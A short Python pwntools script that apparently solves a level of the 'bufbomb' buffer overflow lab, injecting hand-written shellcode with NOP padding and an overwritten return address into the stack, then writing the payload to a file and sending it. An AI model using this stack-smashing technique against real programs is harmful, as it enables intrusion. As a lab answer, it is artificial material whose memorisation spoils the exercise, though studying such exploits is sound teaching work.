#! /bin/python3

from pwn import *

context.binary = './bufbomb'

io = process(['./bufbomb', '-u', '09821978'])

shellcode = b'\x58\xb8\x58\xf1\x13\x80\x8b\x00\xbd\x40\x3d\x68\x55\x68\xd6\x9d\xf1\xf7\x68\xd7\x9b\x13\x80\xc3'
exploit_payload = shellcode + b'\x90' * (0x28 + 0x4 - len(shellcode))
exploit_payload += p32(0x55683cf8)

print(f"{exploit_payload = }")
with open("payload.txt", 'wb') as f:
    f.write(exploit_payload)

io.sendline(exploit_payload)
io.interactive()
